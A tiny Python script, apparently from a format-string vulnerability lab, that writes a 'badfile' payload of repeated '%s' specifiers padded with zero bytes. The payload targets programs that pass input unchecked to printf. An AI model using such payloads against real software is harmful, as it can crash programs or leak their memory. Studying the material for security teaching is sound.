#! /usr/bin/python3
import sys


N = 1500
content = bytearray(0x0 for i in range(N))

s = "%s"*int(sys.argv[1])

fmt = (s).encode('latin-1')
content[0:len(fmt)] = fmt

with open('badfile', 'wb') as f:
    f.write(content)